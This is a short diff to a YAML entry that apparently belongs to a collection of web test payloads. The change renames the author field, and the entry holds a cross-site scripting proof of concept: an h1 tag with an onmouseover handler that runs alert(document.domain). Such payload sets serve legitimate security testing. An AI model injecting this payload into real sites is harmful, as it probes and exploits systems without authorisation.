@@ -3,7 +3,7 @@ metadata:
   filename: "xss-heading-mouseover-poc-alert.yaml"
   tags: ["web", "xss"]
   created: "2025-03-29"
-  author: "Unknown"
+  authors: ["Unknown"]
 
 content: |
   <h1 onmouseover="alert(document.domain)">XSS HOVER TEST</h1>
